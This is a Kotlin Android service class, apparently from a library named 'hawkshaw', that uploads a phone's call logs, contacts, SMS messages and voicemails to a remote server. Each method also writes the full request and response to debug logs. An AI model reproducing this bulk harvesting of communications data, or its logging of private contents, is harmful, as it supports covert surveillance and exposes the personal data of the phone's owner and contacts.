package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.datalayer.models.*
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.datalayer.network.twirp.apiCall
import android.util.Log // Added for logging

/**
 * Implementation of TelephonyService
 */
class TelephonyServiceImpl : TelephonyService {
    private companion object { // Companion object for TAG
        private const val TAG = "TelephonyServiceImplLogs"
    }

    init {
        Log.d(TAG, "[DEBUG] TelephonyServiceImpl instance created.")
    }
    
    /**
     * Push call logs to the server
     * 
     * @param request The call logs data to push
     * @return The response from the server
     */
    override suspend fun pushCallLogs(request: PushCallLogsRequest): ApiResponse<PushCallLogsResponse> {
        Log.d(TAG, "[DEBUG] pushCallLogs called. Request: $request")
        val endpoint = "calllog.CallLog/PushCallLogs"
        // Corrected Log.d call
        Log.d(TAG, "[DEBUG] pushCallLogs: Calling apiCall with endpoint: $endpoint, req: $request")
        val response = apiCall<PushCallLogsRequest, PushCallLogsResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] pushCallLogs: apiCall returned. Response: $response")
        return response
    }
    
    /**
     * Push contacts to the server
     * 
     * @param request The contacts data to push
     * @return The response from the server
     */
    override suspend fun pushContacts(request: PushContactsRequest): ApiResponse<PushContactsResponse> {
        Log.d(TAG, "[DEBUG] pushContacts called. Request: $request")
        val endpoint = "contacts.Contact/PushContacts"
        // Corrected Log.d call
        Log.d(TAG, "[DEBUG] pushContacts: Calling apiCall with endpoint: $endpoint, req: $request")
        val response = apiCall<PushContactsRequest, PushContactsResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] pushContacts: apiCall returned. Response: $response")
        return response
    }
    
    /**
     * Push messages to the server
     * 
     * @param request The messages data to push
     * @return The response from the server
     */
    override suspend fun pushMessages(request: PushMessagesRequest): ApiResponse<PushMessagesResponse> {
        Log.d(TAG, "[DEBUG] pushMessages called. Request: $request")
        val endpoint = "messages.Message/PushMessages"
        // Corrected Log.d call
        Log.d(TAG, "[DEBUG] pushMessages: Calling apiCall with endpoint: $endpoint, req: $request")
        val response = apiCall<PushMessagesRequest, PushMessagesResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] pushMessages: apiCall returned. Response: $response")
        return response
    }
    
    /**
     * Push voicemails to the server
     * 
     * @param request The voicemails data to push
     * @return The response from the server
     */
    override suspend fun pushVoicemails(request: PushVoicemailsRequest): ApiResponse<PushVoicemailsResponse> {
        Log.d(TAG, "[DEBUG] pushVoicemails called. Request: $request")
        val endpoint = "voicemail.Voicemail/PushVoicemails"
        // Corrected Log.d call
        Log.d(TAG, "[DEBUG] pushVoicemails: Calling apiCall with endpoint: $endpoint, req: $request")
        val response = apiCall<PushVoicemailsRequest, PushVoicemailsResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] pushVoicemails: apiCall returned. Response: $response")
        return response
    }
} 
